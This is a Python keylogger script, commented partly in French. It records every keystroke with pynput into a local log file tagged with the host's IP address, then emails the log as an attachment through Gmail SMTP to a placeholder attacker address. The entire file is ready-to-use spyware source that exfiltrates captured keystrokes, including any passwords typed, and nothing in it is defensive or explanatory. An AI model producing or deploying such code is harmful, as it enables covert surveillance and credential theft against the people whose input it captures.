from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import socket

myip = socket.gethostbyname(socket.gethostname())

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()

    #partie EMAIL !

email_user = 'Votre E-mail / Your E-mail'
email_send = 'Votre E-mail / Your E-mail'
email_password = 'Votre Mot de Passe / Your password'
subject = 'Keylogger', myip

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Python Keylogger réponse'
msg.attach(MIMEText(body, 'plain'))

filename='key_log.txt'
attachment =open(filename, 'rb')

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email_user, email_password)

server.sendmail(email_user,email_send,text)
server.quit()
